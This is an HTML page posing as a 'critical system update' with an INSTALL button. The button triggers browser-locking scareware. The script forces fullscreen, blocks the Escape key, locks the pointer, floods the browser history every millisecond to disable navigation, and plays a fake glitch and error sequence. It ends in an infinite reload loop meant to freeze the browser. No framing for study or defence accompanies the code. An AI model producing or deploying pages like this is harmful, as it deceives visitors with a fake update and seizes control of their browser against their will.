<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NEURAL LINK: PERMANENT SYNC</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; color: #00e5ff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; }
        #start-screen { text-align: center; border: 2px solid #00e5ff; padding: 100px; box-shadow: 0 0 100px #00e5ff; }
        .btn-sync { padding: 30px 80px; font-size: 3rem; background: #00e5ff; color: black; border: none; cursor: pointer; font-weight: bold; }
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
        #bar-outer { width: 80%; height: 40px; border: 2px solid #00e5ff; margin-top: 20px; }
        #bar-inner { width: 0%; height: 100%; background: #00e5ff; box-shadow: 0 0 20px #00e5ff; }
        
        /* Glitch Animation Styles */
        #glitch-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 1500;
        }

        .glitch-active {
            animation: glitch-skew 0.2s infinite linear alternate-reverse;
        }

        @keyframes glitch-skew {
            0% { transform: skew(4deg); filter: hue-rotate(90deg); }
            20% { transform: skew(-2deg); filter: invert(1); }
            40% { transform: skew(10deg); }
            60% { transform: skew(-8deg); filter: brightness(2); }
            100% { transform: skew(0deg); }
        }

        #error-image { display: none; width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 2000; }
    </style>
</head>
<body>
    <div id="start-screen">
        <h1>CRITICAL SYSTEM UPDATE</h1>
        <button class="btn-sync" onclick="engage()">INSTALL</button>
    </div>

    <div id="loading-overlay">
        <h1 id="status-msg">OPTIMIZING KERNEL...</h1>
        <div id="bar-outer"><div id="bar-inner"></div></div>
    </div>

    <div id="glitch-overlay"></div>
    <img id="error-image" src="error2.png" alt="System Error">

    <script>
        async function engage() {
            const doc = document.documentElement;
            if (doc.requestFullscreen) await doc.requestFullscreen();
            if (navigator.keyboard && navigator.keyboard.lock) {
                await navigator.keyboard.lock(["Escape"]);
            }
            if (doc.requestPointerLock) doc.requestPointerLock();

            document.getElementById('start-screen').style.display = 'none';
            document.getElementById('loading-overlay').style.display = 'flex';

            window.addEventListener('keydown', (e) => { if (e.key === "Escape") e.preventDefault(); }, true);
            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 1);

            let p = 0;
            const bar = document.getElementById('bar-inner');
            const loadInt = setInterval(() => {
                p += 0.5;
                bar.style.width = p + "%";
                if (p >= 100) {
                    clearInterval(loadInt);
                    startGlitch();
                }
            }, 10);
        }

        function startGlitch() {
            document.getElementById('loading-overlay').style.display = 'none';
            const glitch = document.getElementById('glitch-overlay');
            glitch.style.display = 'block';
            glitch.classList.add('glitch-active');

            // Play static or glitch sound if you have one, or just trigger error.mp3 early
            const audio = new Audio('error.mp3');
            audio.play();

            setTimeout(() => {
                glitch.style.display = 'none';
                triggerErrorMedia();
            }, 1500); // 1.5 seconds of glitching
        }

        function triggerErrorMedia() {
            const errImg = document.getElementById('error-image');
            errImg.style.display = 'block';
            setTimeout(freezeSystem, 1000); 
        }

        function freezeSystem() {
            window.onbeforeunload = function () { localStorage.x = 1; };
            setTimeout(function () {
                while (true) { location.reload(); }
            }, 5000);
        }
    </script>
</body>
</html>
